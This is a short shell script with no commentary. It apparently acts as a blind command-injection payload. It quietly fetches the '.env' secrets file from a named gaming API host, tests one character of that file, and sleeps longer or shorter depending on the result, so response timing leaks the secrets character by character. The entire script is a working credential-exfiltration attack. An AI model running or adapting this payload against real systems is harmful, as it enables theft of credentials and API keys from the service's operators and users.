#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +11 /wa|head -c1)" < 'O' ]&&sleep 25
sleep 12
